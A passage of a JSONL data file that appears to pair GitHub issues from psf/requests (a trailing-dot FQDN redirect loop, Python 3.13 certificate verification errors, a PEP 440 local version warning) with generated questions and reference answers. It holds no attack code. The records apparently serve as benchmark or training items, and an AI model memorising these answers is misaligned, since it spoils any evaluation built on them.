the bug**\nWhen making a request to a URL with a Fully Qualified Domain Name (FQDN) that includes a trailing dot (e.g., `https://pyropus.ca./`), `requests` gets stuck in an infinite redirect loop, eventually raising a `requests.exceptions.TooManyRedirects` exception. \n\nThis happens because the server attempts to redirect the user to the non-FQDN version (without the dot), but `requests` seems to mishandle the Host header or the redirect state with the trailing dot, causing it to loop infinitely.\n\n**To Reproduce**\n```python\nimport requests\n\nres = requests.get(\"https://pyropus.ca./\") \n```\n\n**Expected behavior**\nThe request should successfully follow the redirect to the non-FQDN URL (`https://pyropus.ca/`) and return a `200 OK` status code, just like web browsers (Chrome/Firefox) or `curl` do.\n\n**Workaround found**\nIf we manually inject the Host header without the trailing dot, it bypasses the loop and returns `200`:\n```python\ncustom_headers = {'Host': 'pyropus.ca'}\nres = requests.get(\"https://pyropus.ca./\", headers=custom_headers)\nprint(res.status_code)\n```\n\n**System Information**\n- `requests` version: Latest\n- Python version: 3.10+\n- OS: Linux\n\n**Context**\nThis was discovered while debugging a redirect loop issue inside the Fedora Infrastructure (Anitya project).", "role": "body"}, {"id": "c1", "author": "201841301322", "timestamp": "2026-02-19T09:52:16Z", "body": "<img width=\"1878\" height=\"297\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/9aa982ad-924b-47da-8926-d25d515570f2\" />", "role": "comment"}, {"id": "c2", "author": "nateprewitt", "timestamp": "2026-02-19T15:41:22Z", "body": "Hi @YatesMold, I think the expected behavior is a bit opaque. You can see this same domain was brought to urllib3's attention already in https://github.com/urllib3/urllib3/issues/2873. If you look at the urllib3 code for handling this though, stripping the dot is intentional for the HTTP stack (not DNS). This is a provision of TLS (RFC 6066) for SNI requiring the removal of the trailing dot.\n\n```python\n    def host(self) -> str:\n        \"\"\"\n        Getter method to remove any trailing dots that indicate the hostname is an FQDN.\n\n        In general, SSL certificates don't include the trailing dot indicating a\n        fully-qualified domain name, and thus, they don't validate properly when\n        checked against a domain name that includes the dot. In addition, some\n        servers may not expect to receive the trailing dot when provided.\n\n        However, the hostname with trailing dot is critical to DNS resolution; doing a\n        lookup with the trailing dot will properly only resolve the appropriate FQDN,\n        whereas a lookup without a trailing dot will search the system's search domain\n        list. Thus, it's important to keep the original host around for use only in\n        those cases where it's appropriate (i.e., when doing DNS lookup to establish the\n        actual TCP connection across which we're going to send HTTP requests).\n        \"\"\"\n```\n\nYou'll see that other popular networking libraries like [`curl`](https://github.com/curl/curl/issues/8290) and [aiohttp](https://github.com/aio-libs/aiohttp/pull/7364) share the same behavior. Without a clear consensus on what should change in this case, I don't think we'd make any updates. The server is arguably working incorrectly here, browsers may be able to tolerate it, but that additional overhead is typically not found directly in HTTP tooling.\n\nI'd be inclined to close this as every report of this has been for the same domain. Given no one has been able to produce another example across multiple widely used language's HTTP tooling suggests this is one of a very small subset of misconfigured hosts.\n\n**Edit:** It looks like curl eventually made some changes in https://github.com/curl/curl/commit/2ab1aff8b96017e1b8d902f4b5dcda6e42d75a50. Gauging impact for that is going to be difficult though. This ultimately needs to be addressed in urllib3, rather than Requests, because that's where our `Host` header handling is controlled. Regardless of the outcome, I don't think we'd carry the patch here.\n\n", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/7209#1", "question": "In psf/requests, making a request to a URL with a fully qualified domain name that includes a trailing dot appears to get stuck in a redirect loop and eventually raises `requests.exceptions.TooManyRedirects`. For example:\n\n```python\nimport requests\n\nres = requests.get(\"https://pyropus.ca./\") \n```\n\nI expected Requests to follow the redirect to the non-FQDN URL, `https://pyropus.ca/`, and return `200 OK`, like Chrome/Firefox or `curl` do. A workaround is to manually set the Host header without the trailing dot, which returns 200:\n\n```python\ncustom_headers = {'Host': 'pyropus.ca'}\nres = requests.get(\"https://pyropus.ca./\", headers=custom_headers)\nprint(res.status_code)\n```\n\nSystem information: Requests version \u201cLatest\u201d, Python 3.10+, Linux. This was found while debugging a redirect loop in Fedora Infrastructure\u2019s Anitya project. Is this a Requests bug in how trailing-dot FQDN redirects or the Host header are handled?", "answer": "The maintainer said Requests is unlikely to change this behavior. urllib3 intentionally strips the trailing dot for the HTTP/TLS stack while preserving it for DNS lookup, because TLS SNI/RFC 6066 and certificate validation generally require no trailing dot; the same domain had already been discussed in urllib3 issue #2873. The server is arguably misconfigured, and any change would need to happen in urllib3 because urllib3 controls Requests\u2019 `Host` header handling; Requests would not carry a separate patch.", "knowledge_type": "grounded", "grounding_sources": ["https://github.com/urllib3/urllib3/issues/2873", "urllib3 trailing-dot host handling code", "RFC 6066", "https://github.com/curl/curl/issues/8290", "https://github.com/aio-libs/aiohttp/pull/7364", "https://github.com/curl/curl/commit/2ab1aff8b96017e1b8d902f4b5dcda6e42d75a50"], "answer_grounded_in": "c2", "leak_flags": []}], "answer_in_thread_refs": ["2ab1aff8b96017e1b8d902f4b5dcda6e42d75a50", "https://github.com/aio-libs/aiohttp/pull/7364", "https://github.com/curl/curl/commit/2ab1aff8b96017e1b8d902f4b5dcda6e42d75a50", "https://github.com/curl/curl/issues/8290", "https://github.com/urllib3/urllib3/issues/2873"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-17T06:53:17.632132Z", "review_note": ""}
{"id": "psf/requests/issue/7085", "repo": "psf/requests", "number": 7085, "title": "self sign certificate validation error (requests-2.23.5, urllib3-2.5.0)", "url": "https://github.com/psf/requests/issues/7085", "state": "closed", "created_at": "2025-11-11T14:11:09Z", "closed_at": "2025-12-19T12:04:46Z", "labels": [], "reporter": "vaibhav-chaturvedi", "security_topic": "certificate validation failure due to stricter SSL verification in Python 3.13", "qa_summary": "The certificate verification failure is caused by stricter SSL verification introduced in Python\u202f3.13, as explained in the Python discussion thread on SSL security changes (https://discuss.python.org/t/python-3-13-x-ssl-security-changes/91266).", "question_comment_id": "c0", "answer_comment_id": "c2", "question_author": "vaibhav-chaturvedi", "answer_author": "nateprewitt", "answerer_role": "commenter", "artifacts_needed": ["documentation", "external_reference"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": ["https://discuss.python.org/t/python-3-13-x-ssl-security-changes/91266"]}, "human_note": "", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "vaibhav-chaturvedi", "timestamp": "2025-11-11T14:11:09Z", "body": "Self sign certificate validation is getting failed when using requests 2.23.5 with urllib3 2.5.0. It works with urllib3 1.26.20 version. Any version above 1.26.20 fails to validate certificates.\n\n## Expected Result\nCertificate should be validated.\n\n## Actual Result\n\nTraceback (most recent call last):\n  File \"/home/user/.local/lib/python3.9/site-packages/requests/adapters.py\", line 644, in send\n    resp = conn.urlopen(\n  File \"/home/user/.local/lib/python3.9/site-packages/urllib3/connectionpool.py\", line 843, in urlopen\n    retries = retries.increment(\n  File \"/home/user/.local/lib/python3.9/site-packages/urllib3/util/retry.py\", line 519, in increment\n    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]\nurllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='<hostname>', port=<port>): Max retries exceeded with url: /api/v3/health (Caused by SSLError(SSLCertVerificationError(1, \"[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for '<hostname>'. (_ssl.c:1129)\")))\n\n## Reproduction Steps\n\n```python\nimport requests\nrequests.get(url, verify=<certificate_path>)\n\n\n```\n\n## System Information\n\n    $ python -m requests.help\n\n```json\n{\n  \"chardet\": {\n    \"version\": null\n  },\n  \"charset_normalizer\": {\n    \"version\": \"3.4.4\"\n  },\n  \"cryptography\": {\n    \"version\": \"\"\n  },\n  \"idna\": {\n    \"version\": \"3.11\"\n  },\n  \"implementation\": {\n    \"name\": \"CPython\",\n    \"version\": \"3.9.16\"\n  },\n  \"platform\": {\n    \"release\": \"5.15.0-1092-azure\",\n    \"system\": \"Linux\"\n  },\n  \"pyOpenSSL\": {\n    \"openssl_version\": \"\",\n    \"version\": null\n  },\n  \"requests\": {\n    \"version\": \"2.32.5\"\n  },\n  \"system_ssl\": {\n    \"version\": \"101010ef\"\n  },\n  \"urllib3\": {\n    \"version\": \"2.5.0\"\n  },\n  \"using_charset_normalizer\": true,\n  \"using_pyopenssl\": false\n}\n```\n\n<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,\nplease provide some basic information about your system (Python version,\noperating system, &c). -->\n", "role": "body"}, {"id": "c1", "author": "apisik", "timestamp": "2025-11-21T19:49:51Z", "body": "Hi I am seeing a similar issue!\n\nI work behind a corporate proxy and as such I normally use my own CA bundle.\n\n```python\nimport requests\nimport os\n\nos.environ[\"REQUESTS_CA_BUNDLE\"] = \"cert.cer\"\n\nr = requests.get(\"https://google.com\")\n\nprint(r.status_code)\n```\n\nWhen I run this using `Python 3.12.9` with the following versions and their dependencies:\n\n```bash\nUsing Python 3.12.9 environment at: .venv-312\nPackage            Version\n------------------ ----------\ncertifi            2025.11.12\ncharset-normalizer 3.4.4\nidna               3.11\nrequests           2.32.5\nurllib3            2.5.0\n```\n\neverything works fine:\n\n```bash\n$ uv run python recreate.py\n200\n```\n\nrunning the same script with `Python 3.13.2` with the following versions and their dependencies:\n\n```bash\nUsing Python 3.13.2 environment at: .venv-313\nPackage            Version\n------------------ ----------\ncertifi            2025.11.12\ncharset-normalizer 3.4.4\nidna               3.11\nrequests           2.32.5\nurllib3            2.5.0\n```\n\nI get the following error traceback:\n\n```bash\nTraceback (most recent call last):\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 464, in _make_request\n    self._validate_conn(conn)\n    ~~~~~~~~~~~~~~~~~~~^^^^^^\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 1093, in _validate_conn\n    conn.connect()\n    ~~~~~~~~~~~~^^\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connection.py\", line 790, in connect\n    sock_and_verified = _ssl_wrap_socket_and_match_hostname(\n        sock=sock,\n    ...<14 lines>...\n        assert_fingerprint=self.assert_fingerprint,\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connection.py\", line 969, in _ssl_wrap_socket_and_match_hostname\n    ssl_sock = ssl_wrap_socket(\n        sock=sock,\n    ...<8 lines>...\n        tls_in_tls=tls_in_tls,\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\util\\ssl_.py\", line 480, in ssl_wrap_socket\n    ssl_sock = _ssl_wrap_socket_impl(sock, context, tls_in_tls, server_hostname)\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\util\\ssl_.py\", line 524, in _ssl_wrap_socket_impl\n    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)\n           ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Users\\apisik\\AppData\\Roaming\\uv\\python\\cpython-3.13.2-windows-x86_64-none\\Lib\\ssl.py\", line 455, in wrap_socket\n    return self.sslsocket_class._create(\n           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~^\n        sock=sock,\n        ^^^^^^^^^^\n    ...<5 lines>...\n        session=session\n        ^^^^^^^^^^^^^^^\n    )\n    ^\n  File \"C:\\Users\\apisik\\AppData\\Roaming\\uv\\python\\cpython-3.13.2-windows-x86_64-none\\Lib\\ssl.py\", line 1076, in _create\n    self.do_handshake()\n    ~~~~~~~~~~~~~~~~~^^\n  File \"C:\\Users\\apisik\\AppData\\Roaming\\uv\\python\\cpython-3.13.2-windows-x86_64-none\\Lib\\ssl.py\", line 1372, in do_handshake\n    self._sslobj.do_handshake()\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^\nssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Basic Constraints of CA cert not marked critical (_ssl.c:1028)\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 787, in urlopen\n    response = self._make_request(\n        conn,\n    ...<10 lines>...\n        **response_kw,\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 488, in _make_request\n    raise new_e\nurllib3.exceptions.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Basic Constraints of CA cert not marked critical (_ssl.c:1028)\n\nThe above exception was the direct cause of the following exception:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\adapters.py\", line 644, in send\n    resp = conn.urlopen(\n        method=request.method,\n    ...<9 lines>...\n        chunked=chunked,\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 841, in urlopen\n    retries = retries.increment(\n        method, url, error=new_e, _pool=self, _stacktrace=sys.exc_info()[2]\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\util\\retry.py\", line 519, in increment\n    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nurllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='google.com', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Basic Constraints of CA cert not marked critical (_ssl.c:1028)')))\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\recreate.py\", line 6, in <module>\n    r = requests.get(\"https://google.com\")\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\api.py\", line 73, in get\n    return request(\"get\", url, params=params, **kwargs)\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\api.py\", line 59, in request\n    return session.request(method=method, url=url, **kwargs)\n           ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\sessions.py\", line 589, in request\n    resp = self.send(prep, **send_kwargs)\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\sessions.py\", line 703, in send\n    r = adapter.send(request, **kwargs)\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\adapters.py\", line 675, in send\n    raise SSLError(e, request=request)\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='google.com', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Basic Constraints of CA cert not marked critical (_ssl.c:1028)')))\n```\n\n---\n\n### First Edit:\n\nDoing some more investigating, it appears if I downgrade `urllib3` from version `2.4.0` -> `2.3.0` it starts working. \n\nMaybe seeing what changed between the two might give better insight into what is happening.\n\n---\n\n### Second Edit:\n\nI did the diffing and it appears in python 3.13 stricter verification was added see below:\n\nadded to `src/urllib3/util/ssl_.py`\n\n```bash \n+    if verify_flags is None:\n+        verify_flags = 0\n+        # In Python 3.13+ ssl.create_default_context() sets VERIFY_X509_PARTIAL_CHAIN\n+        # and VERIFY_X509_STRICT so we do the same\n+        if sys.version_info >= (3, 13):\n+            verify_flags |= VERIFY_X509_PARTIAL_CHAIN\n+            verify_flags |= VERIFY_X509_STRICT\n+\n+    context.verify_flags |= verify_flags\n```\n\n---\n\n### Third Edit\n\nIt appears to be a me problem. Upon further investigation our corporate root certificates *may* be misconfigured?\n\nWhat I'm seeing in our certificate when I output it as text using `openssl x509 -in cert.pem -text -noout`\n\n```bash\n        X509v3 extensions:\n            X509v3 Basic Constraints:\n                CA:TRUE\n```\n\nshould be... ? (I ask this because I am unsure)\n\n```bash\n        X509v3 extensions: \n            X509v3 Basic Constraints: critical\n                CA:TRUE\n```", "role": "comment"}, {"id": "c2", "author": "nateprewitt", "timestamp": "2025-11-24T02:05:47Z", "body": "@apisik that's correct, this is a change in CPython for 3.13 that urllib3 is using. The issue you're encountering isn't directly related to Requests. You can find one of the posts on it [here](https://discuss.python.org/t/python-3-13-x-ssl-security-changes/91266).\n\nYou can find some examples there for what typical certificates using this extension look like.", "role": "comment"}, {"id": "c3", "author": "n-badtke-cg", "timestamp": "2025-11-27T16:35:45Z", "body": "The container image for Apache Airflow with version 3.1.3-python3.12 is including these versions of the packages and thus resulting in such error messages.\n\nThis issue might be related to https://github.com/psf/requests/issues/6900", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/7085#1", "question": "I am seeing a certificate verification failure with Requests when using a corporate CA bundle behind a corporate proxy. This works on Python 3.12.9 but fails on Python 3.13.2 with the same Requests/urllib3 versions.\n\nCode:\n\n```python\nimport requests\nimport os\n\nos.environ[\"REQUESTS_CA_BUNDLE\"] = \"cert.cer\"\n\nr = requests.get(\"https://google.com\")\n\nprint(r.status_code)\n```\n\nWith `Python 3.12.9` and:\n\n```bash\nUsing Python 3.12.9 environment at: .venv-312\nPackage            Version\n------------------ ----------\ncertifi            2025.11.12\ncharset-normalizer 3.4.4\nidna               3.11\nrequests           2.32.5\nurllib3            2.5.0\n```\n\nit works:\n\n```bash\n$ uv run python recreate.py\n200\n```\n\nWith `Python 3.13.2` and:\n\n```bash\nUsing Python 3.13.2 environment at: .venv-313\nPackage            Version\n------------------ ----------\ncertifi            2025.11.12\ncharset-normalizer 3.4.4\nidna               3.11\nrequests           2.32.5\nurllib3            2.5.0\n```\n\nI get:\n\n```bash\nTraceback (most recent call last):\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 464, in _make_request\n    self._validate_conn(conn)\n    ~~~~~~~~~~~~~~~~~~~^^^^^^\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 1093, in _validate_conn\n    conn.connect()\n    ~~~~~~~~~~~~^^\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connection.py\", line 790, in connect\n    sock_and_verified = _ssl_wrap_socket_and_match_hostname(\n        sock=sock,\n    ...<14 lines>...\n        assert_fingerprint=self.assert_fingerprint,\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connection.py\", line 969, in _ssl_wrap_socket_and_match_hostname\n    ssl_sock = ssl_wrap_socket(\n        sock=sock,\n    ...<8 lines>...\n        tls_in_tls=tls_in_tls,\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\util\\ssl_.py\", line 480, in ssl_wrap_socket\n    ssl_sock = _ssl_wrap_socket_impl(sock, context, tls_in_tls, server_hostname)\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\util\\ssl_.py\", line 524, in _ssl_wrap_socket_impl\n    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)\n           ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Users\\apisik\\AppData\\Roaming\\uv\\python\\cpython-3.13.2-windows-x86_64-none\\Lib\\ssl.py\", line 455, in wrap_socket\n    return self.sslsocket_class._create(\n           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~^\n        sock=sock,\n        ^^^^^^^^^^\n    ...<5 lines>...\n        session=session\n        ^^^^^^^^^^^^^^^\n    )\n    ^\n  File \"C:\\Users\\apisik\\AppData\\Roaming\\uv\\python\\cpython-3.13.2-windows-x86_64-none\\Lib\\ssl.py\", line 1076, in _create\n    self.do_handshake()\n    ~~~~~~~~~~~~~~~~~^^\n  File \"C:\\Users\\apisik\\AppData\\Roaming\\uv\\python\\cpython-3.13.2-windows-x86_64-none\\Lib\\ssl.py\", line 1372, in do_handshake\n    self._sslobj.do_handshake()\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^\nssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Basic Constraints of CA cert not marked critical (_ssl.c:1028)\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 787, in urlopen\n    response = self._make_request(\n        conn,\n    ...<10 lines>...\n        **response_kw,\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 488, in _make_request\n    raise new_e\nurllib3.exceptions.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Basic Constraints of CA cert not marked critical (_ssl.c:1028)\n\nThe above exception was the direct cause of the following exception:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\adapters.py\", line 644, in send\n    resp = conn.urlopen(\n        method=request.method,\n    ...<9 lines>...\n        chunked=chunked,\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\connectionpool.py\", line 841, in urlopen\n    retries = retries.increment(\n        method, url, error=new_e, _pool=self, _stacktrace=sys.exc_info()[2]\n    )\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\urllib3\\util\\retry.py\", line 519, in increment\n    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nurllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='google.com', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Basic Constraints of CA cert not marked critical (_ssl.c:1028)')))\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\recreate.py\", line 6, in <module>\n    r = requests.get(\"https://google.com\")\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\api.py\", line 73, in get\n    return request(\"get\", url, params=params, **kwargs)\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\api.py\", line 59, in request\n    return session.request(method=method, url=url, **kwargs)\n           ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\sessions.py\", line 589, in request\n    resp = self.send(prep, **send_kwargs)\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\sessions.py\", line 703, in send\n    r = adapter.send(request, **kwargs)\n  File \"C:\\Users\\apisik\\Home\\Dev\\req-troubleshoot\\.venv-313\\Lib\\site-packages\\requests\\adapters.py\", line 675, in send\n    raise SSLError(e, request=request)\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='google.com', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Basic Constraints of CA cert not marked critical (_ssl.c:1028)')))\n```\n\nDowngrading `urllib3` from `2.4.0` to `2.3.0` makes it work. The diff appears to add stricter verification in Python 3.13:\n\n```bash \n+    if verify_flags is None:\n+        verify_flags = 0\n+        # In Python 3.13+ ssl.create_default_context() sets VERIFY_X509_PARTIAL_CHAIN\n+        # and VERIFY_X509_STRICT so we do the same\n+        if sys.version_info >= (3, 13):\n+            verify_flags |= VERIFY_X509_PARTIAL_CHAIN\n+            verify_flags |= VERIFY_X509_STRICT\n+\n+    context.verify_flags |= verify_flags\n```\n\nOur corporate root certificate currently shows:\n\n```bash\n        X509v3 extensions:\n            X509v3 Basic Constraints:\n                CA:TRUE\n```\n\nShould it instead be marked critical like this?\n\n```bash\n        X509v3 extensions: \n            X509v3 Basic Constraints: critical\n                CA:TRUE\n```", "answer": "Yes, that is correct. This is a CPython 3.13 change that urllib3 is using, and the issue is not directly related to Requests. The maintainer pointed to https://discuss.python.org/t/python-3-13-x-ssl-security-changes/91266 for details and examples of typical certificates using this extension.", "knowledge_type": "parametric", "grounding_sources": [], "answer_grounded_in": "c2", "leak_flags": []}], "answer_in_thread_refs": ["https://discuss.python.org/t/python-3-13-x-ssl-security-changes/91266"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-17T06:54:48.112443Z", "review_note": ""}
{"id": "psf/requests/issue/7035", "repo": "psf/requests", "number": 7035, "title": "Warnings Produced when Using a PEP 440 Local Version", "url": "https://github.com/psf/requests/issues/7035", "state": "closed", "created_at": "2025-09-22T18:32:11Z", "closed_at": "2026-02-20T00:56:35Z", "labels": [], "reporter": "bryanfraschetti", "security_topic": "suppressing dependency compatibility warnings for local version identifiers", "qa_summary": "The developer wanted to know if the RequestsDependencyWarning triggered by a local urllib3 version indicates a security\u2011related supply\u2011chain risk and how to address it; the maintainer answered concretely by referencing the warning handling code in Requests (see src/requests/__init__.py#L108\u2011L118) and suggesting filtering the warning.", "question_comment_id": "c0", "answer_comment_id": "c2", "question_author": "bryanfraschetti", "answer_author": "nateprewitt", "answerer_role": "maintainer", "artifacts_needed": ["code", "documentation"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "bryanfraschetti", "timestamp": "2025-09-22T18:32:11Z", "body": "## Summary\n\nWhen packaging urllib3 with a local version identifier, eg. 2.0.7+local.1, and installing requests the [check_compatibility function](https://github.com/psf/requests/blob/main/src/requests/__init__.py#L58) returns warnings after hitting the following traceback. While this only produces a warning, it can be problematic in CIs that are configured to treat warnings as failures\n\n```\n/usr/local/lib/python3.12/dist-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.0.7+local.1) or chardet (None)/charset_normalizer (3.4.2) doesn't match a supported version!\nTraceback (most recent call last):\nFile \"/usr/local/lib/python3.12/dist-packages/requests/__init__.py\", line 109, in <module>\ncheck_compatibility(\nFile \"/usr/local/lib/python3.12/dist-packages/requests/__init__.py\", line 67, in check_compatibility\nmajor, minor, patch = urllib3_version # noqa: F811\n^^^^^^^^^^^^^^^^^^^\nValueError: too many values to unpack (expected 3)\n```\n\nEssentially, the `.` in the local version (+local.1) is split during ```urllib3_version = urllib3_version.split(\".\")```, which results in urllib3_version having four elements instead of the three that are expected, and then the code attempts to destructure the four elements into three variables, causing an exception to be thrown.\n\n## Expected Result\n\nThe expectation was that the version with the local specifier would pass the compatibility check. I think that we can consider only the public version identifier part of the string for the compatibility check and that the local version part of the string could be ignored\n\n## Actual Result\n\nThe compatibility check throws an exception, resulting in warnings.\n\n## Reproduction Steps\n\n```\npython3 -m venv venv\nsource venv/bin/activate\npip install requests urllib3\npython3\n\nPython 3.12.3 (main, Aug 14 2025, 17:47:21) [GCC 13.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import urllib3\n>>> from requests import check_compatibility\n>>> urllib3.__version__ = \"2.0.7+local.1\"\n>>> check_compatibility(\n...     urllib3_version=urllib3.__version__,\n...     chardet_version=None,\n...     charset_normalizer_version=\"3.2.0\",\n... )\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/home/bryan/requests-repro/venv/lib/python3.12/site-packages/requests/__init__.py\", line 67, in check_compatibility\n    major, minor, patch = urllib3_version  # noqa: F811\n    ^^^^^^^^^^^^^^^^^^^\nValueError: too many values to unpack (expected 3)\n```", "role": "body"}, {"id": "c1", "author": "MANAS225", "timestamp": "2025-12-22T17:49:02Z", "body": "Hi \ud83d\udc4b  \n\nThanks for the clear reproduction steps \u2014 I was able to reproduce this locally.\n\nThe issue seems to be that `check_compatibility()` splits the urllib3 version\nstring on `\".\"` without accounting for valid PEP 440 local version identifiers\n(e.g. `2.0.7+local.1`). This results in more than three components and causes\na `ValueError` during unpacking, which then triggers a\n`RequestsDependencyWarning`.\n\nIt looks like we can safely ignore the local version segment for compatibility\nchecks and only consider the public version (`MAJOR.MINOR.PATCH`).\n\nI\u2019m planning to prepare a small PR that:\n- Strips the local version identifier before parsing\n- Adds a test to ensure local versions don\u2019t trigger warnings or exceptions\n\nPlease let me know if this approach sounds reasonable.\n", "role": 